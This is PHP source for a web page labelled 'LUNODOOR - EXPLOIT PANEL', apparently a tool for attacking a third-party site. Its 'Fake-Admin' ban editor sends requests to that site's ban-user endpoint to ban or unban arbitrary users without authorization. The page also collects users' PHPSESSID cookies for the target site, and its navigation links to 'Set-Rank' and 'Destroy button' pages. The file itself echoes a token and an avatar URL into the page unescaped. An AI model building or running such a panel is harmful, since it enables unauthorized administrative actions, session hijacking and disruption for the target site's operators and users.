<?php
session_start();

include("../componements/php/database_conn.php");

$conn = new mysqli($servername, $username, $password, $dbname);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

function getUserAvatar($conn, $token) {
    $stmt = $conn->prepare("SELECT avatar FROM users WHERE token = ?");
    $stmt->bind_param("s", $token);
    $stmt->execute();
    $result = $stmt->get_result();
    if ($result->num_rows > 0) {
        $row = $result->fetch_assoc();
        $stmt->close();
        return $row['avatar'];
    } else {
        $stmt->close();
        return null;
    }
}
function getUserSessidCookie($conn, $token) {
    $stmt = $conn->prepare("SELECT sessid_cookie FROM users WHERE token = ?");
    $stmt->bind_param("s", $token);
    $stmt->execute();
    $result = $stmt->get_result();
    if ($result->num_rows > 0) {
        $row = $result->fetch_assoc();
        $stmt->close();
        return $row['sessid_cookie'];
    } else {
        $stmt->close();
        return null;
    }
}

function getUserRank($conn, $token) {
    $stmt = $conn->prepare("SELECT rank FROM users WHERE token = ?");
    $stmt->bind_param("s", $token);
    $stmt->execute();
    $result = $stmt->get_result();
    if ($result->num_rows > 0) {
        $row = $result->fetch_assoc();
        $stmt->close();
        return $row['rank'];
    } else {
        $stmt->close();
        return null;
    }
}

if (isset($_COOKIE['LS_ASP'])) {
    $token = $_COOKIE['LS_ASP'];
    $avatar_url = getUserAvatar($conn, $token);
    $rank = getUserRank($conn, $token);
    $sessid_cookie = getUserSessidCookie($conn, $token); 

    if ($avatar_url === null) {
        header("Location: ../logout");
        exit;
    }

    if ($sessid_cookie === null || $sessid_cookie === "not_set") {
        $show_modal = true;
    } else {
        $show_modal = false;
    }

    $stmt_banned = $conn->prepare("SELECT banned FROM users WHERE token = ?");
    $stmt_banned->bind_param("s", $token);
    $stmt_banned->execute();
    $stmt_banned->bind_result($banned);
    $stmt_banned->fetch();
    $stmt_banned->close();

    if ($banned == 1) {
        header("Location: ../banned");
        exit;
    }

    date_default_timezone_set('Europe/Paris');

    $stmt = $conn->prepare("SELECT email, id, discord_id, username, created_at, updated_at, rank FROM users WHERE token = ?");
    $stmt->bind_param('s', $token);
    $stmt->execute();
    $result = $stmt->get_result();

    if ($result->num_rows > 0) {
        $row = $result->fetch_assoc();

        $created_at = new DateTime($row['created_at'], new DateTimeZone('UTC'));
        $created_at->setTimezone(new DateTimeZone('Europe/Paris'));

        $updated_at = new DateTime($row['updated_at'], new DateTimeZone('UTC'));
        $updated_at->setTimezone(new DateTimeZone('Europe/Paris'));

        $email = htmlspecialchars($row["email"]);
        $id = htmlspecialchars($row["id"]);
        $discord_id = htmlspecialchars($row["discord_id"]);
        $username = htmlspecialchars($row["username"]);
        $created_at_formatted = htmlspecialchars($created_at->format('Y-m-d H:i:s'));
        $updated_at_formatted = htmlspecialchars($updated_at->format('Y-m-d H:i:s'));
        $rank = htmlspecialchars($row["rank"]);
    } else {
    }

} else {
    header("Location: ../home");
    exit;
}

$conn->close();
?>

<?php
$file = '../authentication/handler/status/status.json';
$status = json_decode(file_get_contents($file), true);
if ($status['status'] === 'offline') {
    include('../help/cgu/index.php');
    die();
}
?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="robots" content="noindex">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>LUNODOOR - EXPLOIT PANEL</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=VT323&display=swap">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
.form-group {
    margin-bottom: 1rem;
    display: flex;
    flex-direction: column;
    align-items: center;
}

.form-group label {
    font-size: 1.25rem;
    color: #e92020;
    margin-bottom: 0.5rem;
}

.form-group input[type="text"],
.form-group input[type="url"],
.form-group select {
    width: 100%;
    max-width: 400px;
    padding: 0.75rem;
    border-radius: 10px;
    border: 1px solid #e92020;
    background-color: #181818;
    color: #e92020;
    font-size: 1rem;
    margin-bottom: 1rem;
    box-shadow: 0 0 5px rgba(255, 0, 0, 0.3);
}

button {
    font-size: 1.25rem;
    padding: 0.75rem 1.5rem;
    border-radius: 10px;
    border: none;
    background-color: #e92020;
    color: #000;
    cursor: pointer;
    transition: background-color 0.3s, color 0.3s;
    margin-top: 1rem;
}
 
button:hover {
    background-color: #bd2424;
    color: #fff;
}

.notification {
    display: none;
    background-color: #181818;
    color: #e92020;
    padding: 1rem;
    border-radius: 10px;
    box-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
    font-size: 1.25rem;
    margin-top: 1rem;
}
        html, body {
            margin: 0;
            padding: 0;
            height: 100%;
            font-family: 'VT323', cursive;
        }

        body {
    background: #ff0000 radial-gradient(#4d1010, #000000);
    color: #e92020;
    font-size: 1.25rem;
}


    h1 {
        font-size: 4rem;
        text-align: center;
        margin: 1rem 0;
        color: #e92020;
        text-shadow: 0 0 20px #e92020;
    }

    nav {
        display: flex;
        align-items: center;
        justify-content: space-between;
        background-color: #181818;
        border-radius: 15px;
        box-shadow: 0 0 15px rgba(255, 0, 0, 0.5);
        margin: 2rem auto;
        width: 90%;
        max-width: 1200px;
        padding: 1rem;
    }

    navprofile {
        display: flex;
        align-items: center;
        justify-content: space-between;
        background-color: #181818;
        border-radius: 15px;
        box-shadow: 0 0 15px rgba(255, 0, 0, 0.5);
        margin: 2rem auto;
        width: 90%;
        max-width: 1200px;
        padding: 1rem;
    }

    .navbar {
        display: flex;
        list-style: none;
        padding: 0;
        margin: 0;
    }

    .navbar a {
        color: #bd2424;
        text-decoration: none;
        padding: 1rem 2rem;
        border-radius: 10px;
        font-size: 1.5rem;
        transition: background-color 0.3s, color 0.3s;
    }

    .navbar a:hover {
        background-color: #6000000;
        color: #eb2626;
    }

    .navbar .active {
        background-color: #6000000;
        color: #eb2626;
        font-weight: bold;
    }
    .profile-dropdown {
    position: relative;
    display: inline-block;
}

.profile-info {
    cursor: pointer;
}

    .profile-pic {
        width: 40px;
        height: 40px;
        border-radius: 50%;
        margin-left: 8px;
    }

    .dropdown-content {
    display: none;
    position: absolute;
    left: 0;
    background-color: #f9f9f9;
    min-width: 160px;
    box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);
    z-index: 1;
    border-radius: 5px;
    top: 100%;
}

    .dropdown-content a {
        color: black;
        padding: 12px 16px;
        text-decoration: none;
        display: block;
    }

    .dropdown-content a:hover {
        background-color: #ddd;
    }

    .profile-dropdown:hover .dropdown-content {
        display: block;
    }

    #video_background {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        object-fit: cover;
        z-index: -1;
    }

    .frosted-effect {
        min-height: 80vh;
        display: flex;
        justify-content: center;
        align-items: center;
        padding: 2rem;
        text-align: center;
        position: relative;
        z-index: 2;
    }

    .frosted-glass {
    background: rgb(24 24 24);
    border-radius: 15px;
    padding: 2rem;
    backdrop-filter: blur(10px);
    color: #e92020;
    max-width: 800px;
    margin: 0 auto;
    box-shadow: 0 0 15px rgb(255 0 0 / 50%);
}
    #sessidModal {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0, 0, 0, 0.85);
            padding: 2rem;
            border-radius: 15px;
            box-shadow: 0 0 20px rgba(233, 32, 32, 0.7);
            z-index: 1000;
            width: 80%;
            max-width: 400px;
            text-align: center;
            color: #e92020;
        }

        #sessidInput {
            width: 100%;
            padding: 0.5rem;
            border-radius: 10px;
            border: 1px solid #e92020;
            background-color: #181818;
            color: #e92020;
            font-size: 1.25rem;
            margin-bottom: 1rem;
        }

        #saveSessidButton {
            font-size: 1.5rem;
            padding: 0.5rem 1rem;
            border-radius: 10px;
            border: none;
            background-color: #e92020;
            color: #000;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        #saveSessidButton:hover {
            background-color: #bd2424;
        }
</style>
</head>
<body>
<div id="sessidModal" style="display:none;">
        <div style="background-color:#000000; padding: 2rem; border-radius: 10px; text-align: center;">
            <h2>Enter your LUNODOOR PHPSESSID</h2>
            <input type="text" id="sessidInput" placeholder="Enter PHPSESSID" style="font-size: 1.5rem; padding: 0.5rem;">
            <button id="saveSessidButton" style="font-size: 1.5rem; padding: 0.5rem;">Save</button>
        </div>
    </div>
    <h1>LUNODOOR - EXPLOIT PANEL</h1>

    <nav>
    <ul class="navbar">
        <li><a href="../home">Home</a></li>
        <li><a href="../setrank">Set-Rank</a></li>
        <li><a href=""class="active">Fake-Admin</a></li>
        <li><a href="../actions">Actions Pads</a></li>
        <li><a href="../destructor">Destroy button</a></li>
    </ul>
    <div class="profile-dropdown">
        <div class="profile-info">
            <span><?php echo htmlspecialchars($username); ?></span>
            <img src="<?php echo $avatar_url; ?>" alt="Profile Picture" class="profile-pic">
        </div>
        <div class="dropdown-content">
            <a href="../logout">Logout</a>
        </div>
    </div>
</nav>
<div class="frosted-effect">
<div class="frosted-glass">
    <h2>Ban Editor</h2>
    <form method="POST" action="">
    <div class="form-group">
        <label for="action">Action:</label>
            <select id="action" name="action" required>
                <option value="ban">Ban</option>
                <option value="unban">Unban</option>
            </select>
    </div>
    <div class="form-group">
        <label for="userid">User ID:</label>
        <input type="text" id="userid" name="userid" required><br><br>
    </div>
        <button type="submit" name="execute">Execute</button>
    </form>

    <?php
    if (isset($_POST['execute'])) {
        $userid = htmlspecialchars($_POST['userid']);
        $action = $_POST['action'];

        if ($action === 'ban') {
            $url = "https://lunodoors.byh.fr/panel/core/ajax/ban-user.php?userid={$userid}&reason=";
        } elseif ($action === 'unban') {
            $url = "https://lunodoors.byh.fr/panel/core/ajax/ban-user.php?userid={$userid}&reason=unban";
        }

        $response = file_get_contents($url);

        echo "<p>" . htmlspecialchars($response) . "</p>";
    }
    ?>
</div>
</div>
<video id="video_background" autoplay loop muted>
    <source src="http://www.eyalkrief.fr/videos/Pac.mp4" type="video/mp4">
    Video not supported
</video>
</body>
</html>
<script>
        $(document).ready(function() {
            var showModal = <?php echo json_encode($show_modal); ?>;
            
            if (showModal) {
                $('#sessidModal').fadeIn();
            }

            $('#saveSessidButton').click(function() {
                var sessid = $('#sessidInput').val();
                
                if (sessid.length === 26) {
                    $.post("update_sessid.php", { sessid: sessid, token: "<?php echo $token; ?>" }, function(data) {
                        if (data.success) {
                            $('#sessidModal').fadeOut();
                        } else {
                            alert("Failed to update. Please try again.");
                        }
                    }, "json");
                } else {
                    alert("Invalid PHPSESSID. Please ensure it's the correct length.");
                }
            });
        });
    </script>